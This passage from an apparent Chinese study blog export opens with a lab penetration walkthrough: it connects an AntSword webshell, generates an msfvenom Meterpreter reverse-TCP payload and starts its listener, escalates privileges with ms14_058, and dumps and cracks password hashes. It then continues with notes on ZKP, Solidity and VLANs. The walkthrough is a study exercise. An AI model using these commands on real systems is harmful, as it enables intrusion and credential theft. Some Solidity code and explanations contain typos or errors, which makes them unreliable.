<h2 id="7-连接木马"><a href="#7-连接木马" class="headerlink" title="7. 连接木马"></a>7. 连接木马</h2><ul>
<li>使用蚁剑连接上传的 <code>aspx</code> 文件。</li>
</ul>
<p><img src="https://s2.loli.net/2024/11/06/vUEJeHn8ab2zCWP.png" alt="13.png"></p>
<h2 id="8-生成并上传-MSF-木马"><a href="#8-生成并上传-MSF-木马" class="headerlink" title="8. 生成并上传 MSF 木马"></a>8. 生成并上传 MSF 木马</h2><ul>
<li><p><strong>生成 MSF 木马</strong>：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;靶机IP&gt; LPORT=6666 -f exe -o 123.exe</span><br></pre></td></tr></table></figure>
<blockquote>
<p>IP 是 Kali 虚拟机的 IP 地址。</p>
</blockquote>
<p><img src="https://s2.loli.net/2024/11/06/m6qtV2A7cTfrI3x.png" alt="14.png"></p>
</li>
<li><p><strong>启动监听器</strong>：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> LHOST &lt;靶机IP&gt;</span><br><span class="line"><span class="built_in">set</span> LPORT 6666</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2024/11/06/9zgmlPdetZsCfGH.png" alt="15.png"></p>
</li>
</ul>
<p> <strong>将木马的exe文件从kali复制到主机，然后上传到蚁剑对应位置</strong></p>
<blockquote>
<p>（进入&#x2F;web&#x2F;upfile&#x2F;affix&#x2F;，右键上传）</p>
</blockquote>
<p><img src="https://s2.loli.net/2024/11/06/B8vSMlg4dXVpGsE.png" alt="16.png"></p>
<ul>
<li><p><strong>启动木马文件</strong>：</p>
<blockquote>
<p>右键⽊⻢⽂件，打开终端 输⼊如下命令 </p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">dir</span> 123.exe</span><br></pre></td></tr></table></figure>

<blockquote>
<p>如果成功，Kali 会成功上线（回到kali终端查看）。</p>
</blockquote>
<p><img src="https://s2.loli.net/2024/11/06/4eorftv6HnB2cOE.png" alt="17.png"></p>
<blockquote>
<p>发现kali成功上线后 可查看到run的执⾏结果（如下图） </p>
</blockquote>
<p><img src="https://s2.loli.net/2024/11/06/sypAoLET8I5rSOe.png" alt="18.png"></p>
<blockquote>
<p>它⾃动的为我们匹配出了⼀些可能的⽤于易受攻击⽬标提权的漏洞利⽤模块</p>
</blockquote>
</li>
</ul>
<h2 id="9-提权操作"><a href="#9-提权操作" class="headerlink" title="9. 提权操作"></a>9. 提权操作</h2><ul>
<li><p>使用以下命令检查提权模块：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">bg</span></span><br><span class="line">sessions</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2024/11/06/yKlRjuSf4AieIZG.png" alt="19.png"></p>
</li>
<li><p><strong>提权操作</strong>：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use multi/recon/local_exploit_suggester</span><br><span class="line"><span class="built_in">set</span> session 1</span><br><span class="line">run</span><br></pre></td></tr></table></figure></li>
</ul>
<p><img src="https://s2.loli.net/2024/11/06/jw1dgqrkM6vGfKQ.png" alt="20.png"></p>
<ul>
<li><p>搜索并利用提权漏洞：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">search ms14_058</span><br><span class="line">use exploit/windows/local/ms14_058_track_popup_menu</span><br><span class="line"><span class="built_in">set</span> session 1</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2024/11/06/Q1njzmoOYVRHAli.png" alt="21.png"></p>
</li>
<li><p><strong>检查权限</strong>：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">getuid</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2024/11/06/qz1U6ZSgwWohAct.png" alt="22.png"></p>
</li>
</ul>
<blockquote>
<p>发现已经是最高权限</p>
</blockquote>
<h2 id="10-持久化攻击"><a href="#10-持久化攻击" class="headerlink" title="10. 持久化攻击"></a>10. 持久化攻击</h2><ul>
<li>获取 <code>administrator</code> 密码：<ul>
<li>使用 <code>hashdump</code> 模块提取密码 hash。<br><img src="https://s2.loli.net/2024/11/06/HlzGqJRjFn2x6pD.png" alt="23.png"><br><img src="https://s2.loli.net/2024/11/06/fOcRn4DyW9VLjsE.png" alt="24.png"><blockquote>
<p>已经可以看到相关账户密码加密后的hash了 </p>
</blockquote>
</li>
<li>将 hash 上传至 <a href="https://www.cmd5.com/">cmd5.com</a> 进行解密，得到密码为 <code>admin123</code>。<br><img src="https://s2.loli.net/2024/11/06/SCmG1Bs2thUEuVy.png" alt="25.png"></li>
</ul>
</li>
</ul>
]]></content>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>ZKP</title>
    <url>/2025/04/18/ZKP/</url>
    <content><![CDATA[<h1 id="计算复杂度理论"><a href="#计算复杂度理论" class="headerlink" title="计算复杂度理论"></a>计算复杂度理论</h1><p>P问题： 可以在多项式时间内求解</p>
<p>NP问题：不可以在多项式时间（可能需要指数或亚指数时间）计算求解；</p>
<p>​				但是可以验证解的正确性。</p>
<p><strong>零知识证明 系统是基于NP问题空间来构建的</strong></p>
<p>什么是IPA</p>
<p>什么是plonk</p>
<p><img src="C:\Users\eightjiu\AppData\Roaming\Typora\typora-user-images\image-20250421010628250.png" alt="image-20250421010628250"></p>
<p><img src="C:\Users\eightjiu\AppData\Roaming\Typora\typora-user-images\image-20250421010705401.png" alt="image-20250421010705401"></p>
<p><img src="C:\Users\eightjiu\AppData\Roaming\Typora\typora-user-images\image-20250423103153217.png" alt="image-20250423103153217"></p>
<p><img src="C:\Users\eightjiu\AppData\Roaming\Typora\typora-user-images\image-20250423103237195.png" alt="image-20250423103237195"></p>
<p><img src="C:\Users\eightjiu\AppData\Roaming\Typora\typora-user-images\image-20250423103357607.png" alt="image-20250423103357607"></p>
<p><img src="C:\Users\eightjiu\AppData\Roaming\Typora\typora-user-images\image-20250423103412248.png" alt="image-20250423103412248"></p>
<p>eg: circom语言</p>
<p><img src="C:\Users\eightjiu\AppData\Roaming\Typora\typora-user-images\image-20250423103526736.png" alt="image-20250423103526736"></p>
<p><img src="C:\Users\eightjiu\AppData\Roaming\Typora\typora-user-images\image-20250423103558450.png" alt="image-20250423103558450"></p>
<p>w1是私用输入</p>
]]></content>
      <tags>
        <tag>区块链</tag>
      </tags>
  </entry>
  <entry>
    <title>solidity基础001</title>
    <url>/2024/11/07/solidity%E5%9F%BA%E7%A1%80%EF%BC%881%EF%BC%89/</url>
    <content><![CDATA[<p>关键词：变量 数值类型 函数 数组 印射<br>仅个人学习使用（WTF学习笔记）</p>
<h3 id="数值类型"><a href="#数值类型" class="headerlink" title="数值类型"></a>数值类型</h3><h4 id="初始值"><a href="#初始值" class="headerlink" title="初始值"></a>初始值</h4><p><strong>bytes1</strong> <strong>是固定大小的字节类型，表示一个 1 字节的值（8 位）。它的初始值（默认值）是 0x00，即所有位都为 0。</strong></p>
<p><strong>具体解释：</strong></p>
<ul>
<li><strong>在 Solidity 中，任何未赋值的变量都会有一个默认值。对于 bytes1 类型，它的默认值是一个长度为 1 字节的值，所有的位都被初始化为 0，用十六进制表示为 0x00。</strong></li>
<li><strong>如果用二进制表示，它是 00000000。</strong></li>
</ul>
<p><strong>值类型初始值</strong></p>
<ul>
<li><p><strong>boolean: false</strong></p>
</li>
<li><p><strong>string: “”</strong></p>
</li>
<li><p><strong>int: 0</strong></p>
</li>
<li><p><strong>uint: 0</strong></p>
</li>
<li><p><strong>enum:</strong> <strong>枚举中的第一个元素</strong></p>
</li>
<li><p><strong>address</strong>: 0x0000000000000000000000000000000000000000 (或 address(0))</p>
</li>
<li><p><strong>function</strong></p>
</li>
<li><ul>
<li><strong>internal:</strong> <strong>空白函数</strong></li>
<li><strong>external:</strong> <strong>空白函数</strong></li>
</ul>
</li>
</ul>
<p><strong>引用类型初始值</strong></p>
<ul>
<li><p><strong>映射mapping: 所有元素都为其默认值的mapping</strong></p>
</li>
<li><p><strong>结构体struct: 所有成员设为其默认值的结构体</strong></p>
</li>
<li><p><strong>数组array</strong></p>
</li>
<li><ul>
<li><strong>动态数组: []</strong></li>
<li><strong>静态数组（定长）: 所有成员设为其默认值的静态数组</strong></li>
</ul>
</li>
</ul>
<p>Bytes4 类型表示的是一个固定长度的字节数组，长度为 4 个字节。每个字节由 2 个十六进制字符表示，因此：<br>• 1 字节 &#x3D; 2 个十六进制字符<br>• 4 字节 &#x3D; 4 × 2 &#x3D; 8 个十六进制字符<br>因此，<strong>bytes4类型具有 8 个十六进制位。</strong><br>示例：<br>例如，一个 bytes4 类型的值可能是 0x12345678，这里的 12345678 就是 8 个十六进制字符。</p>
<h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><h4 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h4><h4 id="可见性说明符"><a href="#可见性说明符" class="headerlink" title="可见性说明符"></a>可见性说明符</h4><h4 id="pure-view-payable"><a href="#pure-view-payable" class="headerlink" title="pure|view|payable"></a>pure|view|payable</h4><h4 id="函数输出"><a href="#函数输出" class="headerlink" title="函数输出"></a>函数输出</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function returnMultiple() public pure returns(uint256, bool, uint256[3] memory) &#123;</span><br><span class="line">   return (1, true, [uint256(1), 2, 5]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><span style = "color: blue;">此处memory是什么？</span><br>  是用于指定数据存储位置的关键字。<strong>它标识的是数据在内存中存储，而不是在区块链上永久存储，通常用于临时存储复杂数据类型（如数组或结构体）并在函数执行期间操作它们，执行完毕后释放资源</strong>。具体来说，memory 指定了在函数执行期间，数据只临时存储在内存中，一旦函数执行完毕，内存中的数据就会被释放。<br>  例如此处：uint256[3] memory 中的 memory 指定了数组 [uint256(1), 2, 5] 将在内存中临时存储，而不是在区块链的持久存储（即 storage）中存储。</p>
<p>  此处代码解析：</p>
<ul>
<li>uint256[3] memory: 定义了一个长度为 3 的 uint256 类型数组，并将其存储在内存中。</li>
<li>[unit256(1),2,5]:<br>• uint256(1)：这个表示法将 1 明确地转换为 uint256 类型。在某些情况下Solidity 可能会自动推断出整数类型为 uint256，但是为了确保类型一致性，可以使用这种显式类型转换。<br>• 2 和 5：这两个值直接写为整数，Solidity会自动将它们识别为 uint256 类型，因它们是未指定类型的字面常量，且默认情况下 Solidity 会将整数推断为 uint256。</li>
</ul>
<h2 id="变量数据存储和作用域："><a href="#变量数据存储和作用域：" class="headerlink" title="变量数据存储和作用域："></a>变量数据存储和作用域：</h2><h3 id="1-声明类型"><a href="#1-声明类型" class="headerlink" title="1. 声明类型"></a>1. 声明类型</h3><h4 id="1-1-Solidity数据存储位置"><a href="#1-1-Solidity数据存储位置" class="headerlink" title="1.1 Solidity数据存储位置"></a>1.1 Solidity数据存储位置</h4><pre><code>有三类：storage，memory和calldata。
</code></pre>
<p>[1]</p>
<p><strong>数据存储类型介绍</strong></p>
<p>（1）Storage（存储） </p>
<p>该存储位置存储永久数据，这意味着该数据可以被合约中的所有函数访问。可以把它视为计算机的硬盘数据，所有数据都永久存储。保存在存储区(Storage)中的变量，以智能合约的状态存储，并且在函数调用之间保持持久性。与其他数据位置相比，存储区数据位置的成本较高。</p>
<p>（2） Memor y（内存） </p>
<p>内存位置是临时数据，比存储位置便宜。它只能在函数中访问。通常，内存数据用于保存临时变量，以便在函数执行期间进行计算。一旦函数执行完毕，它的内容就会被丢弃。你可以把它想象成每个单独函数的内存(RAM)。</p>
<p>（3）Calldata</p>
<p>Calldata是不可修改的非持久性数据位置，所有传递给函数的值，都存储在这里。此外，Calldata是外部函数的参数（而不是返回参数）的默认位置。</p>
<p><strong>存储规则</strong></p>
<p>【2】</p>
<p>【3】</p>
<p>【4】</p>
<p>【5】</p>
<h4 id="1-2-赋值和引用"><a href="#1-2-赋值和引用" class="headerlink" title="1.2 赋值和引用"></a>1.2 赋值和引用</h4><h4 id="1-3常数-constant和immutable"><a href="#1-3常数-constant和immutable" class="headerlink" title="1.3常数 constant和immutable"></a><strong>1.3常数 constant和immutable</strong></h4><p><span style="color: red;"><strong>只有数值变量可以声明constant和immutable；string和bytes可以声明为constant，但不能为immutable</strong></span></p>
<ul>
<li><strong>constant变量必须在声明的时候初始化，之后再也不能改变。尝试改变的话，编译不通过</strong></li>
<li><strong>immutable变量可以在声明时或构造函数中初始化</strong></li>
<li><strong>immutable变量既在声明时初始化，又在constructor中初始化，会使用constructor初始化的值。</strong></li>
</ul>
<h3 id="2-作用域"><a href="#2-作用域" class="headerlink" title="2. 作用域"></a>2. 作用域</h3><h4 id="2-1"><a href="#2-1" class="headerlink" title="2.1"></a>2.1</h4><h4 id="2-2"><a href="#2-2" class="headerlink" title="2.2"></a>2.2</h4><h3 id="2-3全局变量"><a href="#2-3全局变量" class="headerlink" title="2.3全局变量"></a>2.3全局变量</h3><h4 id="2-3-1以太单位-时间单位"><a href="#2-3-1以太单位-时间单位" class="headerlink" title="2.3.1以太单位&amp;时间单位"></a>2.3.1以太单位&amp;时间单位</h4><h3 id="2-4引用类型"><a href="#2-4引用类型" class="headerlink" title="2.4引用类型"></a>2.4引用类型</h3><h4 id="2-4-1数组"><a href="#2-4-1数组" class="headerlink" title="2.4.1数组"></a>2.4.1数组</h4><p>分为：<br>固定数组；<br>可变数组；<br>（bytes比较特殊，是数组，但是不用加[]另外，不能用byte[]声明单字节数组，可以使用bytes或bytes1[]。bytes比bytes1[]省gas。</p>
<p><strong>创建数组的规则</strong><br>对于memory修饰的动态数组，可以用new操作符号来创建，但是必须声明长度，并且声明后长度不能改变。</p>
<p>eg：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// memory动态数组</span><br><span class="line">uint[] memory array8 = new uint[](5);</span><br><span class="line">bytes memory array9 = new bytes(9);</span><br></pre></td></tr></table></figure>
<p>如果创建的是动态数组，需要一个一个元素的赋值。</p>
<p><strong>数组成员</strong></p>
<ul>
<li><strong>length</strong>: 数组有一个包含元素数量的<strong>length</strong>成员，<strong>memory</strong>数组的长度在创建后是固定的。</li>
<li><strong>push()</strong>: <strong>动态数组</strong>拥有<strong>push()<strong>成员，可以在数组最后添加一个</strong>0</strong>元素，并返回该元素的引用。</li>
<li><strong>push(x)</strong>: <strong>动态数组</strong>拥有<strong>push(x)<strong>成员，可以在数组最后添加一个</strong>x</strong>元素。</li>
<li><strong>pop()</strong>: <strong>动态数组</strong>拥有**pop()**成员，可以移除数组最后一个元素（与数据结构的栈相同）</li>
</ul>
<h4 id="2-4-2结构体"><a href="#2-4-2结构体" class="headerlink" title="2.4.2结构体"></a>2.4.2结构体</h4><p><strong>创建结构体</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//结构体</span><br><span class="line">struct Student&#123;</span><br><span class="line">uint256 id;</span><br><span class="line">uint256 score;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Student student;//初始化一个student结构体</span><br></pre></td></tr></table></figure>

<p><strong>结构体赋值方法</strong></p>
<p><em>方法1:在函数中创建一个storage的struct引用</em></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function initStudent1() external&#123;</span><br><span class="line">	Student storage _student = student;</span><br><span class="line">	_stdent.id = 11;</span><br><span class="line">	_student.score = 100;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>storage</strong></p>
<p><em>方法2:直接引用状态变量的struct</em></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function initStudent2() external&#123;</span><br><span class="line">	student.id = 11;</span><br><span class="line">	stundet.score = 100;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><em>方法3:构造函数式</em></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function initStudent3() external&#123;</span><br><span class="line">student = Student(11,100);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><em>方法4:key value</em></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function initStudent4() external&#123;</span><br><span class="line">	student = Student(&#123;id: 11,score: 100&#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="2-4-3印射-（mapping"><a href="#2-4-3印射-（mapping" class="headerlink" title="2.4.3印射 （mapping)"></a>2.4.3印射 （mapping)</h4><p><strong>定义： Solidity中存储键值对的数据结构，可以理解为哈希表</strong></p>
<p><strong>mapping变量不存长度信息</strong></p>
<p>在映射中，人们可以<strong>通过键（Key）来查询对应的值（Value）</strong></p>
<p>比如：通过一个人的id来查询他的钱包地址。</p>
<p>格式为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mapping(_KeyType =&gt; _ValueType)</span><br></pre></td></tr></table></figure>

<p>其中_KeyType和_ValueType分别是Key和Value的变量类型</p>
<p>例子：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mapping(uint =&gt; address) public idToAddress; // id映射到地址</span><br><span class="line">mapping(address =&gt; address) public swapPair; // 币对的映射，地址到地址</span><br></pre></td></tr></table></figure>



<h6 id="映射的规则"><a href="#映射的规则" class="headerlink" title="映射的规则"></a>映射的规则</h6><p><strong>规则1</strong></p>
<p>映射的_keytype只能选择solidity内置的值类型，比如uint,address等，不能用自定义的结构体，而_Valuetype可以使用自定义的类型（例如：结构体）。</p>
<p><strong>规则2</strong></p>
<p>映射的存储位置必须是storage，因此可以用于合约的状态变量，函数中的storage变量和library函数的参数（<a href="https://github.com/ethereum/solidity/issues/4635">例子</a>）。不能用于public函数的参数或返回结果中，因为mapping记录的是一种关系（key-value pair)。</p>
<p><strong>规则3</strong></p>
<p>如果映射声明为 public，那么Solidity会自动给你创建一个 getter 函数，可以通过 key 来查询对应的 value 。<br><strong>规则4</strong></p>
<p>给映射新增的键值对的语法为_var[_Key]&#x3D; _value，其中 _var 是映射变量名，_Key 和_value 对应新增的键值对。</p>
<p>eg: </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function writeMap(uint key,address Value)public&#123;</span><br><span class="line">	idToAddress[ Key]= Value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>






<h2 id="题："><a href="#题：" class="headerlink" title="题："></a>题：</h2><h3 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h3><p>请解释下面这段代码的意思：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">address payable addr;</span><br><span class="line">addr.transfer(1);</span><br></pre></td></tr></table></figure>
<p>选择一个答案<br>A. 调用者向合约转账1wei<br>B. 调用者向addr转账1wei<br>C. 合约向addr转账1wei<br>D. 合约向addr转账1ether</p>
<p><strong>解析：</strong></p>
<ul>
<li>address payable: 这是一个 payable 地址类型，表示这个地址能够接收以太币（ether）转账。只有 payable 地址才允许进行 transfer() 或 send() 操作。</li>
<li>addr.transfer(1): 这是一个转账操作，向地址 addr 转账 1 单位的以太币，单位是 wei。在以太坊中，最小的货币单位是 wei，而 1 ether &#x3D; 10^18 wei。因此，这里转账的数额是 1 wei，而不是 1 ether。</li>
<li>transfer操作是合约向addr转账。<br>正确答案选c</li>
</ul>
<h3 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h3><p>以下关于数组的说法中，正确的是(选择一个答案)</p>
<p> A. 固定长度数组和bytes拥有push()成员，可以在数组最后添加一个0元素。</p>
<p> B. 数组字面常数，例如[uint(1),2,3]，需要声明第一个元素的类型，不然默认用存储空间最大的类型</p>
<p> C. 内存数组的长度在创建后是固定的。 </p>
<p> D. 对于memory可变长度数组，可以用new操作符来创建，并且不用声明长度，例如uint[] </p>
<p><strong>解析</strong>：</p>
<ul>
<li><p><strong>A. 固定长度数组和 bytes 拥有 push() 成员，可以在数组最后添加一个0元素。</strong><br> 这句话是错误的。<strong>固定长度数组</strong>没有 push() 成员，只有 <strong>可变长度数组</strong>     才有 push() 成员，而 bytes 是可变长度数组，因此 bytes 可以使用 push()，但固定长度数组不能。</p>
</li>
<li><p>选项 B 的说法 不正确。原因：<strong>在 Solidity 中，数组字面常量的类型推断并不会自动默认为存储空间最大的类型。</strong>类型推断基于数组字面量中的元素值：对于一个字面量数组，如 [1, 2, 3]，Solidity 会推断这些数字为最小的适当类型。例如，在这种情况下，uint8 就足够了，因为所有数字都能用 8 位来表示，而不会默认推断为 uint256。<strong>只有在数组的元素中存在更大范围的数值时，编译器才会选择相应的更大类型。如果你希望指定一个更大的类型（比如 uint256），需要显式地声明。</strong>因此，数组字面常量中的类型并不会默认使用存储空间最大的类型，而是基于实际的数值大小来推断最适合的类型。</p>
<p><strong>示例：</strong></p>
<p>[1, 2, 3] 会推断为 uint8。</p>
<p>[uint256(1), 2, 3] 才会显式地使用 uint256 进行类型推断。</p>
</li>
</ul>
<p>所以，B 选项的说法是 不正确的。</p>
<ul>
<li><p><strong>C. 内存数组的长度在创建后是固定的。</strong></p>
</li>
<li><p>D. 这句话是错误的。使用 new 操作符创建内存数组时，必须指定数组的长度，不能省略长度声明。正确的用法是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uint[] memory array = new uint[](length);</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h3><p>以下关于结构体的说法中，错误的是</p>
<p>选择一个答案</p>
<p>A. 通过结构体的形式可以定义新的类型。</p>
<p>B. 结构体内可以包含字符串，整型等基本数据类型，也可以包含数组，映射，结构体等复杂类型。</p>
<p>C. 结构体内可以包含其本身。</p>
<p><strong>解析</strong>：</p>
<ul>
<li>A. 这是正确的。结构体在 Solidity 中用于定义新的自定义类型，允许开发者创建更复杂的数据结构。</li>
<li>B. 这是正确的。结构体可以包含基本数据类型（如 uint、string），也可以包含复杂类型（如数组、映射、其他结构体）。</li>
<li>C.  这是错误的。在 Solidity 中，结构体不能直接包含其本身，因为这会导致无限嵌套，无法确定内存的大小。不过，结构体可以包含指向其他结构体的     引用，例如使用指针或映射的方式来实现递归关系。</li>
</ul>
<p>因此，选项 C 是错误的。</p>
<h3 id="4"><a href="#4" class="headerlink" title="4."></a>4.</h3><p> 在如下的合约中，我们定义了四个 immutable 的变量 y1, y2, y3, y4。</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> uint256 immutable y1; </span><br><span class="line"></span><br><span class="line">address immutable y2; </span><br><span class="line"></span><br><span class="line">address immutable y3; </span><br><span class="line"></span><br><span class="line">uint256 immutable y4;</span><br><span class="line"></span><br><span class="line"> constructor (uint256 _y4)&#123; </span><br><span class="line"></span><br><span class="line">y1 = block.number; </span><br><span class="line"></span><br><span class="line">y2 = address(this);</span><br><span class="line"></span><br><span class="line">y3 = msg.sender;</span><br><span class="line"></span><br><span class="line">y4 = _y4; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>其中，确实有必要在构造函数 constructor 中才赋值的一项是： </p>
<p>A. y1 B. y2 C. y3 D. y4</p>
<p><strong>解析：</strong></p>
<ul>
<li><strong>y4 是通过构造函数参数 _y4 传入的值，因此只有在部署合约时才能确定它的值，这使得它必须在构造函数中赋值。</strong></li>
</ul>
<p><strong>其他变量在构造函数外也可以直接赋值，或者它们的值是在合约部署时自动确定的：</strong></p>
<ul>
<li><strong>y1：可以在合约外直接赋值为 block.number，表示合约部署时的区块号。</strong></li>
<li><strong>y2：可以直接设置为 address(this)，即合约自身的地址，在合约部署时自动确定。</strong></li>
<li><strong>y3：可以直接设置为 msg.sender，即部署合约的地址，也是在合约部署时自动确定的。</strong></li>
</ul>
<p><strong>因此，只有 y4 是依赖于构造函数参数，必须在构造函数中进行赋值。选D。</strong></p>
<h3 id="5"><a href="#5" class="headerlink" title="5."></a>5.</h3><p><strong>下面定义变量的语句中，会报错的一项是：</strong> </p>
<p><strong>A. string constant x5 &#x3D; “hello world”;</strong> </p>
<p><strong>B. address constant x6 &#x3D; address(0);</strong> </p>
<p><strong>C. string immutable x7 &#x3D; “hello world”;</strong> </p>
<p><strong>D. address immutable x8 &#x3D; address(0);</strong></p>
<p><strong>解析：</strong></p>
<ul>
<li><strong>在 Solidity 中，immutable 变量必须在 构造函数中 赋值，而不能在声明时直接赋值。</strong></li>
</ul>
<p><strong>具体说明：</strong></p>
<ul>
<li>**A. string constant x5 &#x3D; “hello world”;**<strong>：constant 变量必须在声明时赋值，因此这是正确的。</strong></li>
<li>**B. address constant x6 &#x3D; address(0);**<strong>：constant 变量在声明时赋值是正确的。</strong></li>
<li>**C. string immutable x7 &#x3D; “hello     world”;**<strong>：这是错误的，因为 immutable 变量不能在声明时赋值，必须在构造函数中进行赋值。</strong></li>
<li>**D. address immutable x8 &#x3D; address(0);**<strong>：虽然是 immutable 变量，但它的赋值可以在构造函数中完成，定义时不能直接赋值。此处代码如果在构造函数中赋值是正确的。</strong></li>
</ul>
<p><strong>因此，选项 C 会报错。</strong></p>
<p> <strong>ps</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//命名式返回</span><br><span class="line">function returnNamed() public pure returns(uint256_number, bool _bool, uint256[3] memory _array)(</span><br><span class="line">_number = 2;</span><br><span class="line">_bool = false;</span><br><span class="line">_array = [uint256(3),2,1];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>命名式返回，依然支持return</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Function returnNamed2() public pure returns(uint256 _number,bool _bool,unit256[3] memory _arrray)</span><br><span class="line">&#123;</span><br><span class="line"> return(1,true,[unit256(1),2,5]);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>



<ul>
<li><p>_array 被赋值为 [uint256(3), 2, 1]。这表示它是一个包含三个元素的数组，其中：<br>• 第一个元素是 3（明确类型转换为 uint256）。<br>• 第二个元素是 2（自动推断为 uint256）。<br>• 第三个元素是 1（自动推断为 uint256）。</p>
</li>
<li><p>Solidity中不存在小数点，以0代替为小数点，举例<br>在Solidity 中，确实没有内置的浮点数（即小数点），因此所有数字必须使用整数类型来表示。这就需要通过一些技巧来模拟小数点，通常是通过将小数值放大为整数来进行计算。例如，如果要表示金额，可以假设整数中的最低位是 “小数点后的一位” 或更多位，这样就能间接表示小数。<br>例子：<br>假设我们想在 Solidity 中表示货币金额，而没有浮点数。我们可以使用整数表示金额，并通过约定整数的最后几位代表小数部分。常见的方法是<strong>将金额放大 10^18（即使用以太坊中的 wei 单位），将以太作为以太坊中的基本单位</strong>。<br>举例 1: 表示金额<br>假设要表示 1.5 个以太币。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uint256 public amount = 1.5 * 10**18; // 1.5 Ether 等于 1.5 * 10^18 wei</span><br></pre></td></tr></table></figure>
<p>• 在这里，我们使用 10^18 来表示一个以太币，因为<strong>1 ether &#x3D; 10^18 wei</strong>。为了表示 1.5 个以太币，我们将 1.5 乘以 10^18，最终得到 1500000000000000000 wei。<br>• 尽管 Solidity 不支持浮点数，但我们通过使用整数和固定的精度来实现。<br>举例 2: 模拟小数点计算<br>假设我们有一个代币，代币的精度是小数点后 2 位。我们可以通过放大 100 倍来处理小数点。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uint256 public pricePerToken = 150; // 实际上表示 1.50 单位（放大了100倍）</span><br></pre></td></tr></table></figure>
<p><strong>我们可以通过数学计算来恢复小数点后的值</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uint256 price = pricePerToken / 100;      // 还原整数部分</span><br><span class="line">uint256 decimals = pricePerToken % 100;   // 取出小数部分</span><br></pre></td></tr></table></figure>
<p>这样 150 就表示 1.50，即使用整数的 150 来代表 1.50。<br>举例 3: 更高精度<br>如果需要<strong>更多的精度，比如小数点后 6 位，可以通过乘以 10^6 来处理</strong>。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uint256 public value = 1234567; // 实际表示 1.234567</span><br><span class="line">总结</span><br></pre></td></tr></table></figure>
<p>在 Solidity 中，通过使用整数来表示带有小数点的值，可以避免精度问题。具体方法是根据需要的精度将小数部分转化为整数进行计算，并在使用时再将其缩放回实际数值。例如，通过乘以 10^18 或 10^6 来模拟 18 位或 6 位的小数。</p>
</li>
<li><p>Wei &#x3D; 1</p>
</li>
<li><p>Gwei &#x3D; 1e9 &#x3D; 1000000000</p>
</li>
<li><p>ether &#x3D; 1e18 &#x3D; 100000000000000000</p>
</li>
</ul>
]]></content>
      <tags>
        <tag>solidity</tag>
      </tags>
  </entry>
  <entry>
    <title>【学习笔记】简单网络结构的搭建/vlan配置</title>
    <url>/2024/10/23/vlan%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<p>(重新粗糙存档一下，过程图基本都丢失了，仅用于个人学习笔记使用)</p>
<ol>
<li>网络基础架构图</li>
<li>网络通信的原理</li>
<li>软件的使用</li>
</ol>
<p>​       a. 关于拓扑图： 接入层交换机，汇聚层交换机</p>
<p>​        b.技术实现6要求</p>
<h3 id="Vlan-trunk-不同vlan间的通信（三层交换技术）"><a href="#Vlan-trunk-不同vlan间的通信（三层交换技术）" class="headerlink" title="Vlan trunk 不同vlan间的通信（三层交换技术）"></a>Vlan trunk 不同vlan间的通信（三层交换技术）</h3><h4 id="交换机的基础命令-知识："><a href="#交换机的基础命令-知识：" class="headerlink" title="交换机的基础命令&#x2F;知识："></a>交换机的基础命令&#x2F;知识：</h4><ol>
<li><p>vlan: 虚拟局域网</p>
</li>
<li><p>vlan trunk stp 链路聚合</p>
